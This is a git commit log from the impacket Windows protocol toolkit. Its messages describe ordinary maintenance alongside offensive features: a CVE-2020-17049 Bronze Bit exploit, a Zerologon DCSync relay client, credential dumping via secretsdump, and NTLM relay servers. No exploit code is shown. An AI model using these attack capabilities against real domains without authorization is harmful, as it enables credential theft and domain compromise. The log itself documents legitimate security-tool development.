Date:   Fri Jan 8 11:26:03 2021 -0300

    Merge branch 'master' of https://github.com/snovvcrash/impacket into snovvcrash-master

commit 49546f728d6a80112eaf3c5e43981cadcb92e759
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Sat Dec 26 16:49:14 2020 +0300

    Compute NTHash and AESKey for Bronze Bit Attack

commit c2749e472c86850b4c993985ab0a90cb1fd08de4
Author: mxrch <17338428+mxrch@users.noreply.github.com>
Date:   Sat Dec 26 03:07:46 2020 +0100

    Added command description

commit e852343adfee6b66075d3c94510661ccf7fab03e
Author: mxrch <kvwaljam@protonmail.ch>
Date:   Sat Dec 26 02:50:15 2020 +0100

    Added cat command to smbclient

commit 27ca93be213e57ee34198392f306af6bfe851798
Author: Tim Gates <tim.gates@iress.com>
Date:   Thu Dec 24 15:52:55 2020 +1100

    docs: fix simple typo, gettting -> getting
    
    There is a small typo in impacket/examples/ntlmrelayx/servers/socksserver.py.
    
    Should read `getting` rather than `gettting`.

commit ac307704949a55c3619a2fb6c8369b974a226592
Merge: aa0c78ad eaaac860
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Dec 9 13:32:55 2020 -0300

    Merge pull request #1013 from jakekarnes42/master
    
    Exploit for CVE-2020-17049: new -force-forwardable flag for getST.py

commit eaaac860a9a57a5e97f033c85b2d4772facaa24a
Author: Jake Karnes <jake.karnes@gmail.com>
Date:   Tue Dec 8 12:10:07 2020 -0800

    Adding CVE-2020-17049 exploit
    
    See https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-overview for an overview with links to deep dives into the vulnerability and exploit.

commit 81d1368cb621b7048d8d3d0a783cd5e9534e0dfe
Author: Jake Karnes <jake.karnes@gmail.com>
Date:   Tue Dec 8 12:08:45 2020 -0800

    Updating to handle missing "renew_till" value.
    
    After KB4586793 for CVE-2020-17049 the "renew_till" timestamp may be omitted from service tickets.

commit aa0c78ad7bd4fae11d765ed717e0f415c030f83e
Merge: fe239768 27089452
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Dec 3 12:55:20 2020 -0300

    Merge pull request #998 from jagotu/master
    
    NTLMrelayx HTTPRelayServer: Python 3.x

commit fe2397688b56b64877ce54c4dedd1f0799439e24
Merge: e1b9e247 e97aa3bd
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Dec 3 12:54:19 2020 -0300

    Merge pull request #1003 from mpgn/patch-1
    
    Fix encoding problem with smv1 connection #1002

commit e1b9e247de5b4514ea3f5b0229e8187d9e8142d4
Merge: f0a190af c4e4057b
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Dec 3 12:53:24 2020 -0300

    Merge pull request #1005 from mohemiv/iphlp
    
     Adding implementation of iphlpsvc.dll MSRPC calls

commit f0a190afb76c51f8080ec0bf7d4301f7a68adece
Merge: 04271a5d 84f00b22
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Dec 3 12:50:54 2020 -0300

    Merge pull request #995 from mohemiv/master
    
    Speeding up DcSync

commit 04271a5d4462a60b54d4b3e5a4755f20c8a2c24c
Merge: bb084df7 06cd1709
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Dec 3 12:46:13 2020 -0300

    Merge pull request #986 from vruello/rpc_smb_timeout
    
    Support connect timeout with SMBTransport

commit c4e4057b1bd0b412d661cdfe9ff04e6e4dbcc4fd
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Tue Dec 1 19:26:15 2020 +0300

    Fixing Travis CI tests

commit 21c2d73454c6f1e9938fa0221c69908c5dc9f6ec
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Tue Dec 1 19:16:08 2020 +0300

    Adding implementation of iphlpsvc.dll MSRPC calls

commit bb084df771f665b4de3b58b419643ed958cf8128
Author: asolino <bethus@gmail.com>
Date:   Sun Nov 29 16:13:26 2020 -0300

    Ignoring incoming NETBIOS_SESSION_KEEP_ALIVE requests
    
    - Per RFC 1002, we're discarding that packet.
    - We weren't, thus introducing an "Unexpected answer from server" exception

commit e97aa3bd52bfb650b9f792b6e178136867c36ee6
Author: mpgn <martial.puygrenier@gmail.com>
Date:   Sat Nov 28 01:16:59 2020 +0100

    Fix encoding problem with smv1 connection #1002

commit 18df212327d13fd83b8ee752bb63fa210c421e0a
Author: asolino <bethus@gmail.com>
Date:   Mon Nov 23 13:26:51 2020 -0300

    Adding offline CryptUnprotectData functionality
    
    - Thru the unprotect command.
    - You need to specify the masterkey needed for decryption, you can decrypt masterkeys using the masterkey command.
    - You can optionally specify an extra entropy either as a string or a binary file.

commit 4a8bd4028193db52db3f4e1407bd98ca68ee557b
Author: asolino <bethus@gmail.com>
Date:   Mon Nov 23 11:45:28 2020 -0300

    And going back to dev version :)

commit 2438fb66cea4c6a9b4a04939e1ef9c4208d60134
Author: asolino <bethus@gmail.com>
Date:   Mon Nov 23 10:56:07 2020 -0300

    Adjusting tag

commit 7744710e44aa1f08c85f77b54e8519daf8d59a8f
Author: asolino <bethus@gmail.com>
Date:   Mon Nov 23 10:53:43 2020 -0300

    About to tag a release

commit 2708945273704d92fea00e9ac0a5fc1dc7331050
Author: JaGoTu <jagotu@gmail.com>
Date:   Thu Nov 19 12:49:30 2020 +0100

    NTLMrelayx HTTPRelayServer: Python 3.x

commit 84f00b221c55cdba6520b2f05e9148ff9f0dce92
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Tue Nov 17 03:43:36 2020 +0300

    Speeding up DcSync

commit d1ced941eb2235ed365b13f661b1d5b4bc2683f3
Merge: d7039ed0 c95160d8
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Nov 12 14:12:02 2020 -0300

    Merge pull request #961 from Mr-Gag/master
    
    Support Docker

commit d7039ed0c90fb87a737157043e044fb68910fb8d
Merge: d7ed8dba 4b414a4f
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Nov 12 13:49:08 2020 -0300

    Merge pull request #989 from cnotin/patch-1
    
    Delete comment for myself

commit 4b414a4fd9af5438c11fbf0737fcbd801eba7126
Author: Clément Notin <clement@notin.org>
Date:   Sat Nov 7 19:47:27 2020 +0100

    Delete comment for myself
    
    Python2 compatibility was tested and implemented :)
    Sorry I forgot to clean this comment

commit d7ed8dba25315b30993279f2f4b2e8bd37298510
Merge: a31fc847 e3f44857
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Nov 5 15:43:42 2020 -0300

    Merge pull request #938 from cnotin/patch-4
    
    Update comments

commit a31fc847d317b306d3e45be46a56429008dad432
Merge: db75c56f d28dce01
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Nov 5 15:43:02 2020 -0300

    Merge pull request #948 from Dliv3/master
    
    Avoid cipher_list DeprecationWarning on Python3

commit db75c56f5837af3dc0e5fa8a215e84a149ea7d33
Merge: ce07da1d 2ea63630
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Nov 5 15:42:02 2020 -0300

    Merge pull request #979 from Hackndo/ldapattack-computerscontainer
    
    Fix issue when relaying and creating computer in CN=Computers

commit ce07da1d6dd4531b02ac543d4b87ed26613a255f
Merge: 4aca7647 e5f24d1f
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 5 15:39:29 2020 -0300

    Merge branch 'cnotin-pr-wcfrelayserver'

commit e5f24d1f58cd96d6f7bf869bc22a1134138bca18
Merge: 4aca7647 3056fdeb
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 5 14:29:43 2020 -0300

    Merge branch 'pr-wcfrelayserver' of https://github.com/cnotin/impacket into cnotin-pr-wcfrelayserver

commit 4aca764741225d1078cbda9094c6cb3fe3def7ed
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 5 13:29:52 2020 -0300

    Replacing shebang with a virtualenv friendly one

commit da48cfe7fe0f8469c648ed31fcdda2991e59dc82
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 5 11:51:59 2020 -0300

    Updating installation instruction for Python 3.x

commit 094895c1e550dbf8b3339c3f85e2e8ba0cb614fe
Merge: 81eec85a 2f786181
Author: asolino <bethus@gmail.com>
Date:   Thu Nov 5 10:51:30 2020 -0300

    Merge branch 'phefley-master'

commit 06cd1709b52ff9dac1c5daa63cea5016f7cc2bfe
Author: Vincent Ruello <vruello@users.noreply.github.com>
Date:   Thu Nov 5 13:18:46 2020 +0100

    Support connect timeout with SMBTransport

commit 2f786181d07db4660c7e8f00749b812380d17948
Author: root <root@localhost.localdomain>
Date:   Thu Oct 29 17:22:29 2020 -0500

    Updated to specifically delete a shadow based on ID.
    Only looks at the ntds drive for shadows.
    
            modified:   impacket/examples/secretsdump.py

commit 2ea6363006f5302f9faa2b5dc68804a02334a9fe
Author: pixis <hackndo@gmail.com>
Date:   Sat Oct 24 19:27:33 2020 +0200

    Fix issue when relaying to default CN=Computers

commit 81eec85a90201f82239c9264e4d762fd155aaf45
Author: asolino <bethus@gmail.com>
Date:   Thu Oct 15 13:06:15 2020 -0300

    Fixing ServerChallenge default value
    
    - Reggresion introduced by https://github.com/SecureAuthCorp/impacket/commit/b923413fc8737efdb84f08a791cc655f9e5113e0
    - Should address https://github.com/SecureAuthCorp/impacket/issues/974

commit 431959ad35e7231e3603d3e464b9535fd8bad32c
Author: asolino <bethus@gmail.com>
Date:   Wed Oct 14 16:55:31 2020 -0300

    Fixed typo

commit 78a219db07400009d90c5a26cd7c7fa17e0fd493
Merge: e715bac7 3c9e17e1
Author: aconite33 <aconite33@users.noreply.github.com>
Date:   Wed Sep 30 16:24:10 2020 -0400

    Merge pull request #1 from blacklanternsecurity/missimer
    
    Missimer

commit 3c9e17e1ead48152676556c0fb8b6a6f31554c14
Author: Aconite33 <kazul33@gmail.com>
Date:   Wed Sep 30 15:54:25 2020 -0400

    Fixed typo.

commit 3f80a57a0a05725dce7eeae0e41bbede0cbac0c0
Merge: e715bac7 fe642b24
Author: Eric Missimer <eric@blsgvt.com>
Date:   Wed Sep 30 15:46:21 2020 -0400

    Merge remote-tracking branch 'original/master'

commit fe642b24be7aa870251df8a650ba1ac3bb8ef7e4
Merge: fb91eae0 501859c3
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Sep 29 15:21:57 2020 -0300

    Merge pull request #916 from mohemiv/atexec
    
    Enforcing RPC_C_AUTHN_LEVEL_PKT_PRIVACY for atexec.py

commit fb91eae0d9881ffb743edf108a6cb04ca0f80cba
Merge: ffd4a0e7 2deb6ed4
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Sep 29 14:58:18 2020 -0300

    Merge pull request #950 from mohemiv/master
    
    Minor bug fixes

commit ffd4a0e74dbe52ef410438c16369a71370d1aa40
Merge: 65cf657f f2af5a26
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Tue Sep 29 14:52:37 2020 -0300

    Merge pull request #963 from vbersier/master
    
    Fix Exception when splitting request bytes string in samba server

commit f2af5a2699fddaace217dab204985895e9b7084d
Author: Valentin Bersier <vbersier@gmail.com>
Date:   Tue Sep 29 15:27:48 2020 +0200

    Fixed superfluous unhexlify in `setSMBChallenge`

commit 7b472b7e9602803640109ade751540907a581323
Author: Valentin Bersier <vbersier@gmail.com>
Date:   Tue Sep 29 11:08:53 2020 +0200

    Fix Exception when splitting request binary string in samba server

commit c95160d8f067b89decbd2c382861f013488f2163
Author: yassine birig <gobirig@gmail.com>
Date:   Sun Sep 27 00:12:08 2020 +0100

    change link

commit 326f13f7577e535fd4e2df5b803285c825e72a21
Author: yassine birig <gobirig@gmail.com>
Date:   Sun Sep 27 00:04:45 2020 +0100

    modifiy README add Docker build and usage"

commit 01ddba846fe2ce90eb454d54091e95e8ce5c797e
Author: yassine birig <gobirig@gmail.com>
Date:   Sat Sep 26 23:55:53 2020 +0100

    add Docker file

commit 65cf657f00ba36ea9396be263007e08b4d71f3c1
Merge: 02d65e14 63eb977d
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Sep 24 18:33:26 2020 -0300

    Merge pull request #959 from dirkjanm/dcsyncrelay
    
    Zerologon dcsync relay client

commit 63eb977dc9c817216d82a48adceaff07d12fb83f
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Thu Sep 24 21:59:14 2020 +0200

    py2 fix and small cleanup

commit a7537124f44f5f8b1abc63dfcf17025f307c3ce2
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Thu Sep 24 21:40:52 2020 +0200

    dcsync relay client

commit 02d65e149c60ac619e7946661bb1c7344bee2f75
Merge: 84c8d6a7 865f4e03
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Sep 24 09:55:15 2020 -0300

    Merge pull request #901 from ABCIFOGeowi40/master
    
    Fixed dcomrt.py MinorVersion Problem

commit 84c8d6a7490fb4a1319d83d614b53552656cc6d0
Merge: ba6cc81d a79c6032
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Sep 21 17:50:10 2020 -0300

    Merge pull request #957 from dirkjanm/guestauth
    
    skip target selection for anonymous auth

commit a79c6032bc09f5f6b23bfd70ffb86ca7f385bdae
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Sep 21 20:59:58 2020 +0200

    actually that should be the original smb1 command

commit d04091efaf10e8348534860c6a59ac0c44c00c32
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Sep 21 20:56:49 2020 +0200

    skip target selection for anonymous auth

commit ba6cc81d35aa38e1c36588a347cd1f0d7386e6e4
Merge: 7ed645aa 2860ab9d
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Sep 21 15:03:15 2020 -0300

    Merge pull request #956 from dirkjanm/cleanupfix
    
    Small fix in secretsdump cleanup

commit 2860ab9d374d1fc480f54e4677ee7a5872b46ed7
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Sep 21 19:02:33 2020 +0200

    don't initiate a new connection if there is nothing to clean

commit 7ed645aad5542637cb1e06af0db209473e38c35a
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 21 12:23:26 2020 -0300

    Fixing SMB1 relay behaviour
    
    - relayToHost variable should be cleared after succesfull relay.
    - Fixes https://github.com/SecureAuthCorp/impacket/issues/954

commit b7288fddc28c99d9d95a6c053e4f957b43c359d4
Author: Sam Freeside <snovvcrash@protonmail.ch>
Date:   Wed Sep 16 22:13:41 2020 +0300

    Edit new password verification part

commit ad600a098a1e9e65309995c202f118512a568667
Author: Sam Freeside <snovvcrash@protonmail.ch>
Date:   Wed Sep 16 22:08:40 2020 +0300

    Show RPC dump if non-zero code returned

commit 78e8c8e41b3f163f1271a01ce3f2bf3bb880f687
Merge: 81d44893 1397e2b5
Author: asolino <bethus@gmail.com>
Date:   Tue Sep 15 11:52:25 2020 -0300

    Merge branch 'dirkjanm-plaintext-machine2'

commit 1397e2b52f3aa238fda32c93a48c1bcb1eeacba7
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Tue Sep 15 16:00:06 2020 +0200

    change default secretsdump behavior to also dump plaintext machine account password

commit 81d44893a464e406bd9e97e0d54012225546a2b5
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 14 16:20:22 2020 -0300

    Fixing minor Python3 compatibility
    
    - Related to https://github.com/SecureAuthCorp/impacket/pull/951

commit b867b21de5fcfd48686a04487e1ef83c2d1b5e47
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 14 16:06:00 2020 -0300

    Setting ClearNewPassword field as a general fixed array
    
    - So you can encrypt the NL_TRUST_PASSWORD struct yourself and put the result in there.
    - Related to https://github.com/SecureAuthCorp/impacket/pull/951

commit 64ce46580286b5ab15a4737bddf85201ce2adde3
Merge: 15f3df26 0bd850c3
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 14 13:13:46 2020 -0300

    Merge branch 'dirkjanm-NetrServerPasswordSet2'

commit 0bd850c3ed53b56d1a13b126b6839bbf5e019076
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 14 13:13:14 2020 -0300

    Adding NetrServerPasswordSet2 and hNetrServerPasswordSet2 test cases

commit 11a2fe4bac60583c85ede4591b8551cec2165ee0
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 14 13:12:33 2020 -0300

    Minor adjustments on NetrServerPasswordSet2 definition
    
    - Added hNetrServerPasswordSet2 helper method

commit 052a849caa0dd7db80bbc0b4fd157862287246ce
Author: Dirkjan Mollema <dirkjan.mollema@fox-it.com>
Date:   Mon Sep 14 15:22:23 2020 +0200

    some netlogon structs for NetrServerPasswordSet2

commit 2deb6ed449957ded7ba3ae63d06b43036a62a4c6
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Sat Sep 12 00:33:14 2020 +0300

    Fixing store_true default value

commit 15f3df268493996512a600e722f82dfd63eae966
Merge: aab83f8c 4aaae185
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 9 15:07:38 2020 -0300

    Merge branch 'ptswarm-spns'

commit 4aaae1854f16994b84f6530991a24d381073303f
Merge: aab83f8c 2d874dc9
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 9 15:05:49 2020 -0300

    Merge branch 'spns' of https://github.com/ptswarm/impacket into ptswarm-spns

commit aab83f8c91ab3c535581bc0034a317786be54a60
Merge: d84fca22 3b2b8192
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Sep 9 14:01:21 2020 -0300

    Merge pull request #949 from cnotin/patch-1
    
    Remove superfluous UTF16 encoding

commit 3b2b81922c18a58a6bc1bfee6a5051ff2cd26c48
Author: Clément Notin <clement@notin.org>
Date:   Tue Sep 8 18:11:14 2020 +0200

    Remove superfluous UTF16 encoding
    
    It's already a string and it gives an ugly UTF16 output when using --enum-local-admins (and only on the first part which is the domain)

commit d28dce018664928abb3752509ad00518ae73f67e
Author: Dliv3 <dddliv3@gmail.com>
Date:   Tue Sep 8 14:34:35 2020 +0800

    Avoid cipher_list DeprecationWarning on Python3

commit d84fca225175729bdf215adca10f3b3bd5a84733
Merge: 80aaf63a cca78f39
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Sep 7 11:27:04 2020 -0300

    Merge pull request #945 from cclauss/Python3.8
    
    Travis CI: Add Python 3.8 to the testing (again)

commit cca78f3964ba75f3e7be85e68ac1b0733164da06
Author: cclauss <cclauss@me.com>
Date:   Mon Sep 7 15:57:25 2020 +0200

    Travis CI: Add Python 3.8 to the testing (again)

commit 80aaf63ac8d1a1458b51971e75a0450bb381237d
Merge: dd5e3d9c 0535ef79
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 7 10:19:34 2020 -0300

    Merge branch 'master' of https://github.com/SecureAuthCorp/impacket

commit 0535ef793c7ab7e66c46e2acb06fd5b07196d731
Merge: ad99ae74 ae21fb10
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Sep 7 10:19:28 2020 -0300

    Merge pull request #928 from franferrax/master
    
    Introduce the [MS-NLMP] 2.2.2.10 VERSION structure in NTLMAuthNegotiate messages

commit dd5e3d9c6fa14c561c03b315e6c39ddbb82acc01
Merge: 29b7e15e ad99ae74
Author: asolino <bethus@gmail.com>
Date:   Mon Sep 7 10:18:09 2020 -0300

    Merge branch 'master' of https://github.com/SecureAuthCorp/impacket

commit ad99ae74ca830f0c4c691b8d8e149274efb3970a
Merge: d55c1c8c 1347a81d
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Sep 7 10:17:43 2020 -0300

    Merge pull request #931 from cclauss/patch-3
    
    Avoid SyntaxWarning on Python >= 3.8

commit 3056fdeb33bee9e9b76c47b9faba13080c2841e3
Author: Clément Notin <clement@notin.org>
Date:   Sun Sep 6 17:49:28 2020 +0200

    WCFRelayServer: add Py2 compat

commit 53300f71fe2dda5f5997a67dc5f51aacfdddce35
Author: Clément Notin <clement@notin.org>
Date:   Wed Sep 2 23:33:54 2020 +0200

    WCFRelayServer for ntlmrelayx implementing WCF NetTcpBinding / ADWS

commit 55e47713325c5a0f505eb6c03bab95bceea8cfde
Author: Clément Notin <clement@notin.org>
Date:   Sun Sep 6 16:19:08 2020 +0200

    Use SPNEGO_NegTokenResp to craft packet instead of raw binary

commit c3da54aeaca05c95ccdd26565a81ca47de7dc88d
Author: Clément Notin <clement@notin.org>
Date:   Fri Sep 4 01:18:31 2020 +0200

    SPNEGO_NegTokenResp is specified with "NegState" and not "NegResult"

commit 29b7e15e1357ace933cc3ee415c4f65bc8b8a97b
Merge: 5ea69aed d55c1c8c
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 15:53:54 2020 -0300

    Merge branch 'master' of https://github.com/SecureAuthCorp/impacket

commit d55c1c8c4fa0022fd1ef5d1447ed94e1c0cfc73b
Merge: fed64924 8d2d5543
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Sep 4 15:53:38 2020 -0300

    Merge pull request #939 from cnotin/patch-5
    
    Catch DistributionNotFound exception when trying to get version number and package not installed

commit 5ea69aed7a48dccc7e9d6019b787dfbf03026c00
Merge: 2fbf2d65 fed64924
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 15:53:12 2020 -0300

    Merge branch 'master' of https://github.com/SecureAuthCorp/impacket

commit 2fbf2d655472e98a192744dc8894b527fee57621
Merge: 0d0f43cc 5b226028
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 15:53:03 2020 -0300

    Merge branch 'cnotin-patch-5'

commit 0d0f43cccf140c0a991a194397a1b26cc4a65b09
Merge: fd736bb9 8d2d5543
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 15:51:44 2020 -0300

    Merge branch 'patch-5' of https://github.com/cnotin/impacket

commit 8d2d554368b7cbe96e66dd83409de02fdb28b27f
Author: Clément Notin <clement@notin.org>
Date:   Fri Sep 4 20:44:24 2020 +0200

    Add instruction to run "setup.py egg_info" when DistributionNotFound

commit 5b226028b6b2bdadc800a284b9a44f2fb5c692b1
Merge: fd736bb9 7c9c9975
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 15:19:17 2020 -0300

    Merge branch 'patch-5' of https://github.com/cnotin/impacket into cnotin-patch-5

commit fed64924e537c4a655271b98c98454fe4c9ee28b
Merge: fd736bb9 ceb721a7
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Sep 4 15:13:17 2020 -0300

    Merge pull request #940 from cnotin/pr-exception-subscriptable
    
    Fix "exception is not subscriptable" error

commit fd736bb99baf41aabcb6ab1a347c791f5406fb1d
Merge: 4ef274de 59c8e122
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 15:08:42 2020 -0300

    Merge branch 'cnotin-patch-3'

commit 59c8e1222b124f313ade8550e9780f810c883549
Merge: 4ef274de ea6d2550
Author: asolino <bethus@gmail.com>
Date:   Fri Sep 4 15:08:07 2020 -0300

    Merge branch 'patch-3' of https://github.com/cnotin/impacket into cnotin-patch-3

commit 4ef274dea737d4ad8e1ac53ae56a45e0e87f741f
Merge: 1f507965 e6dfad9e
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Sep 4 15:05:14 2020 -0300

    Merge pull request #936 from cnotin/patch-2
    
    SOCKS HTTP plugin: fix bytes encoding issues

commit 1f507965525bb2e94284de311ff3c9674f98e5af
Merge: 3c32a77f ab24690e
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Fri Sep 4 15:03:47 2020 -0300

    Merge pull request #935 from cnotin/patch-1
    
    Convert b64encode from bytes to str to fix NTLM content in HTTP header

commit ceb721a76805dca64e38e14a20a9d8b92e4c3882
Author: Clément Notin <clement@notin.org>
Date:   Fri Sep 4 00:12:46 2020 +0200

    Properly detect when SMB negotiation failed due to ConnectionResetError
    
    We don't get the "socketerror" anymore as nmb.py catches it, retries and finally throws a generic Exception. See https://github.com/SecureAuthCorp/impacket/blob/3c32a77fe82be1e34bc78e89c92b1d25fe3f5d96/impacket/smbconnection.py#L186-L188

commit a613e27c0f69b4b4d03c4149a73632b3cfbaca80
Author: Clément Notin <clement@notin.org>
Date:   Thu Sep 3 23:58:01 2020 +0200

    Fix "exception is not subscriptable" error
    
    ex.errno is the way to get the exception "errno" in Python 2 and 3
    Fixes #934

commit 7c9c99756be6410d9528142cdc7c324938ea120c
Author: Clément Notin <clement@notin.org>
Date:   Thu Sep 3 23:34:10 2020 +0200

    Catch DistributionNotFound exception when trying to get version number and package not installed
    
    For example when running it for development in an IDE

commit e3f448576b8ba964490b318f7f4e69dfd534b69a
Author: Clément Notin <clement@notin.org>
Date:   Thu Sep 3 20:12:47 2020 +0200

    Update comments

commit ea6d25500f66c4271d8d380731694ee210d063d0
Author: Clément Notin <clement@notin.org>
Date:   Thu Sep 3 18:55:28 2020 +0200

    ntlmrelayx: "isinstance" needs a tuple of types, not a list

commit e6dfad9eebb0b9adc8ef2e7cb149f572203475e2
Author: Clément Notin <clement@notin.org>
Date:   Thu Sep 3 18:36:31 2020 +0200

    SOCKS HTTP plugin: fix bytes encoding issues

commit ab24690e9df3b6d285e72207b56052faee0cf273
Author: Clément Notin <clement@notin.org>
Date:   Thu Sep 3 16:43:46 2020 +0200

    Convert b64encode from bytes to str to fix NTLM content in HTTP header

commit 3c32a77fe82be1e34bc78e89c92b1d25fe3f5d96
Merge: 65ed4a71 48c43f42
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Sep 2 14:05:02 2020 -0300

    Merge pull request #933 from 5alt/master
    
    Fix reading binary file error while using custom exe file

commit 65ed4a713a397c4895cc4c0f41f05a221c2a07e7
Author: asolino <bethus@gmail.com>
Date:   Wed Sep 2 13:06:55 2020 -0300

    Adding win32 constrain to pyreadline

commit 1347a81df0327d325ea3efd99354d73a38dbd1b6
Author: Christian Clauss <cclauss@me.com>
Date:   Wed Sep 2 15:30:39 2020 +0200

    Travis CI: Fix build config validation issues

commit 48c43f42b4d9639e0261338a1e0969306a1306fb
Author: 5alt <md5_salt@qq.com>
Date:   Wed Sep 2 14:50:55 2020 +0800

    Fix SMB error when using port 139
    
    Remove SMBv3 in negoData

commit 6c7229fccbdf2367e4188d034d831a389e401206
Author: 5alt <md5_salt@qq.com>
Date:   Wed Sep 2 13:29:05 2020 +0800

    Fix reading binary file error while using custom exe file
    
    Replace all `open(self.__exeFile)` to `open(self.__exeFile, 'rb')`

commit 9689c75fa4bb052f17c9d1ca1140c97987cb694b
Author: Clément Notin <clement@notin.org>
Date:   Tue Sep 1 23:56:49 2020 +0200

    Add pyreadline requirement

commit 7532caabc72eaac279de6a001d227f7d14c744c8
Author: Christian Clauss <cclauss@me.com>
Date:   Thu Aug 27 21:26:51 2020 +0200

    Avoid SyntaxWarning on Python >= 3.8
    
    Avoid [SyntaxWarnings on Python >= 3.8](https://docs.python.org/3/whatsnew/3.8.html#porting-to-python-3-8).
    
    % `python3.8`
    ```
    >>> "" is ""
    <stdin>:1: SyntaxWarning: "is" with a literal. Did you mean "=="?
    ```

commit 9485b0c25eb634774da4fda133ed57218a36aceb
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 26 10:19:17 2020 -0300

    Adding -ntlmchallenge parameter
    
    * Allows to specify the NTLM Server Challenge used when receiving a connection.
    * Addresses https://github.com/SecureAuthCorp/impacket/issues/927

commit b923413fc8737efdb84f08a791cc655f9e5113e0
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 26 10:00:08 2020 -0300

    Fix for exception inside outputToJohnFormat when logging SMBv1 Standard Security hashes
    
    * Small fix on how to store the server challenge as well.

commit 63e7fdfb380f00588eca6697124c68c81ec7c373
Author: Sam Freeside <snovvcrash@protonmail.ch>
Date:   Tue Aug 25 20:59:29 2020 +0300

    Update example

commit 016551329e03f0f74ea2e977954db8f6906ecb8e
Author: Sam Freeside <snovvcrash@protonmail.ch>
Date:   Tue Aug 25 13:52:49 2020 +0300

    Add forgotten imports

commit 78308c85a60e57456329bd178a882f1278d93853
Author: Sam Freeside <snovvcrash@protonmail.ch>
Date:   Tue Aug 25 13:38:11 2020 +0300

    Change arguments format

commit 550f2d47ff6a718a1ab33145deb85d441f8d5dbe
Author: Sam Freeside <snovvcrash@protonmail.ch>
Date:   Tue Aug 25 13:36:24 2020 +0300

    Add exception handling

commit ae21fb10b06c119ca7b7421f89b10e995a4f8e14
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Mon Aug 24 20:57:25 2020 -0300

    Implement test cases for acd32c6 & 74e085e changes

commit cce94ae754faa86057cfd1e44914cf00a283b52b
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Mon Aug 24 20:54:57 2020 -0300

    Remove no longer valid warning message
    
    After 46ebcfb changes, aTime is automatically set depending on the ntlm.TEST_CASE variable value, so this warning is outdated

commit 74e085eecd1af3ef478a045e6c65c812ae41934d
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Mon Aug 24 20:54:04 2020 -0300

    Remove unused/dead code: NTLMAuthMixin

commit acd32c6d275c1fd22eda4c3bc0170f51be9dbb07
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Mon Aug 24 20:53:28 2020 -0300

    Introduce the [MS-NLMP] 2.2.2.10 VERSION structure for NTLMAuthNegotiate
    
    More info: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/b1a6ceb2-f8ad-462b-b5af-f18527c48175

commit b5fa089b058b097037efd79760d71bae39524948
Merge: 257dc19c fdc6c935
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 19 17:06:51 2020 -0300

    Merge branch 'ptswarm-exchanger'

commit fdc6c935de27ae94b06d697ccc2890bb519ef62b
Author: asolino <bethus@gmail.com>
Date:   Wed Aug 19 16:59:48 2020 -0300

    Fix ArgumentParser.add_subparser 'required' argument Python version supported.
    
